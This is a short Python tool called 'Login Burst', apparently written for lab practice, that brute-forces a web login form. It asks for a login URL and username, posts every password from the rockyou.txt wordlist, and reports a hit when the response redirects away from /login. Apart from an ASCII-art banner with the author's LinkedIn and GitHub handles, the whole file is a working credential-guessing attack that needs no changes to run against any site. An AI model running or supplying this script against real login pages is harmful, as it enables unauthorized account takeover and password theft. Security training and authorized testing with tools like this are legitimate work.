from pyfiglet import figlet_format
from termcolor import colored 
import requests

#Follow on LinkedIn if You have got till here.

print(colored(figlet_format("Login Burst", font="big"), "red"))
print(colored("Educate. Demonstrate. Defend....", "blue"))
print(colored(figlet_format("By Muzzamil Arain", font="digital")))
print(colored("LinkedIn: muzzamil-sadiq-7195b2258\t \t Github: github.com/muzzamilarain\n" , "yellow"))

url = input("Enter the login URL (e.g., http://10.10.98.201/login): ").strip()
username = input("Enter the username to brute-force: ").strip()

wordlist_path = "/usr/share/wordlists/rockyou.txt"

try:
    with open(wordlist_path, "r", encoding="latin-1") as file:
        passwords = file.readlines()
except FileNotFoundError:
    print(f"[-] Wordlist not found at {wordlist_path}")
    exit()

for password in passwords:
    password = password.strip()
    print(f"Trying: {password}")

    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, data=data, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        continue

    if response.status_code == 302:
        redirect_location = response.headers.get("Location", "")
        if "/login" not in redirect_location:
            print(f"\n[+] Password found: {password}")
            break
else:
    print("\n[-] No valid password found.")
